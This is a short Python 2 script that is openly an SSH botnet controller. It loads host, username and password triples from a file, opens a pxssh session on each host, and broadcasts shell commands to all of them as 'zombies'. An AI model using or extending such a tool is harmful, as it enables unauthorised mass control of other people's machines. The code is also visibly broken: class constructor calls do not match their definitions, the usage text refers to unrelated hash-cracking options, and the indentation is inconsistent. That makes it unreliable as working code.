#!/usr/bin/python

import optparse
import pxssh
botNet = []

class Client:
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.connect()

	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password)
			return s
		except Exception, e:
			print e
			print '[-] Error Connecting to Host: ' + self.host + '\r'

	def send_command(self, cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before

class Zombie:
	def botnetCommand(self, command):
		for client in botNet:
			output = client.send_command(command)
			print '[*] Output from ' + client.host
			print '[+] ' + output + '\n'

	def addClient(self, host, user, password):
		client = Client(host, user, password)
		botNet.append(client)

	def woot(self, dict):
	        myBots = open(dict, 'r')
        	for xlist in myBots.readlines():
                	xHost = xlist.split(':')[0]
	                xUser = xlist.split(':')[1]
        	        xPass = xlist.split(':')[2]
                	self.addClient(xHost, xUser, xPass)
	        self.botnetCommand('uname -a')


def main():
	parser = optparse.OptionParser("%prog -H <hash file> -D <dict file> -A <algorithm>")
	parser.add_option('-L', dest='myFile', type='string', help='specify bot file to communicate with')
	(options, args) = parser.parse_args()
	myFile = options.myFile
	if (myFile == None):
		print '[-] You are missing arguments please run with --help option'
	        exit(0)

	z = Zombie(myFile)
	z.woot()

if __name__ == '__main__':
	main()


